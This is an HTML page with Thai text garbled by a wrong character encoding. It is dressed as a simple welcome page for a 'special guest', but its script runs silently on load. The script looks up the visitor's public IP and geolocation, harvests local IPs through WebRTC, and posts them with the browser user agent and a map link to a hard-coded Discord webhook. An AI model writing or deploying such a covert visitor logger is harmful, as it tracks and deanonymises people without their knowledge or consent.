<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>‚úÖ ‡∏¢‡∏¥‡∏ô‡∏î‡∏µ‡∏ï‡πâ‡∏≠‡∏ô‡∏£‡∏±‡∏ö‡∏™‡∏π‡πà‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1>‚úÖ ‡∏¢‡∏¥‡∏ô‡∏î‡∏µ‡∏ï‡πâ‡∏≠‡∏ô‡∏£‡∏±‡∏ö‡∏™‡∏π‡πà‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå</h1>
    <p>‡∏Ñ‡∏∏‡∏ì‡πÄ‡∏õ‡πá‡∏ô‡πÅ‡∏Ç‡∏Å‡∏û‡∏¥‡πÄ‡∏®‡∏©‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤</p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÄ‡∏õ‡πá‡∏ô webhook ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì

    async function getLocalIPs() {
      return new Promise((resolve, reject) => {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(err => reject(err));
        pc.onicecandidate = event => {
          if (!event.candidate) {
            resolve([...ips]);
            return;
          }
          const parts = event.candidate.candidate.split(' ');
          const ip = parts[4];
          if (ip && !ips.has(ip)) {
            ips.add(ip);
          }
        };
      });
    }

    async function sendToDiscord(publicInfo, localIPs) {
      const mapUrl = `https://www.google.com/maps?q=${publicInfo.latitude},${publicInfo.longitude}`;

      const payload = {
        username: "üåê ‡∏ú‡∏π‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ä‡∏°‡πÄ‡∏ß‡πá‡∏ö!",
        embeds: [{
          title: "üöÄ ‡∏°‡∏µ‡∏ú‡∏π‡πâ‡πÄ‡∏¢‡∏µ‡πà‡∏¢‡∏°‡∏ä‡∏°‡πÉ‡∏´‡∏°‡πà",
          color: 0x00ccff,
          fields: [
            { name: "üïí ‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏Ç‡πâ‡∏≤", value: new Date().toLocaleString(), inline: false },
            { name: "üåç IP ‡∏à‡∏£‡∏¥‡∏á", value: publicInfo.ip, inline: true },
            { name: "üåç ‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®/‡πÄ‡∏°‡∏∑‡∏≠‡∏á", value: `${publicInfo.country_name} / ${publicInfo.city || '‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•'}`, inline: true },
            { name: "üíª ‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå", value: navigator.userAgent, inline: false },
            { name: "üìç ‡∏î‡∏π‡πÅ‡∏ú‡∏ô‡∏ó‡∏µ‡πà", value: `[‡∏Ñ‡∏•‡∏¥‡∏Å‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏π‡πÅ‡∏ú‡∏ô‡∏ó‡∏µ‡πà](${mapUrl})`, inline: false },
            { name: "üõ°Ô∏è IP ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î (Local + Public) ‡∏ó‡∏µ‡πà‡∏û‡∏ö", value: localIPs.join(", "), inline: false }
          ]
        }]
      };

      try {
        const res = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error(`‡∏™‡πà‡∏á Webhook ‡πÑ‡∏°‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‡∏£‡∏´‡∏±‡∏™: ${res.status}`);
        console.log("‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ Discord ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢");
      } catch (err) {
        console.error("‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î:", err);
      }
    }

    (async () => {
      try {
        const res = await fetch("https://ipapi.co/json/?lang=th");
        const publicInfo = await res.json();
        const localIPs = await getLocalIPs();

        await sendToDiscord(publicInfo, localIPs);
      } catch (err) {
        console.error("‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î:", err);
      }
    })();
  </script>
</body>
</html>
